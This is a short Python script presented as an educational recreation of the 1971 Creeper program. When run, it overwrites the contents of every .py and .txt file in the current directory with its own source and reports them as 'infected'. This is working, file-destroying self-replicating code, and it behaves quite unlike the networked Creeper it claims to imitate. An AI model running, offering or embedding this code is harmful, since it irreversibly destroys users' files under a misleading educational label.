#!/usr/bin/env python3
"""
Creeper (1971) - Educational self-replicating program
Bob Thomas / BBN - First virus concept
"""
import os
import sys
import glob
import datetime

INFECTED_LOG = []

def self_replicate():
    source = __file__
    with open(source, 'r', encoding='utf-8') as f:
        code = f.read()

    targets = glob.glob("*.py") + glob.glob("*.txt")
    for t in targets:
        if os.path.basename(t) == os.path.basename(source):
            continue
        if os.path.basename(t) == "creeper.py":
            continue
        with open(t, 'w', encoding='utf-8') as f:
            f.write(code)
        INFECTED_LOG.append(t)
        print(f"[creep] infected: {t}")

    # Memory footprint simulation
    _memory_payload = [code[:100]] * (1024 * 2)

def main():
    print("I'M THE CREEPER: CATCH ME IF YOU CAN.")
    self_replicate()
    print(f"[creep] infections: {len(INFECTED_LOG)} file(s)")
    print("[creep] use antivirus to remove me")

if __name__ == "__main__":
    main()
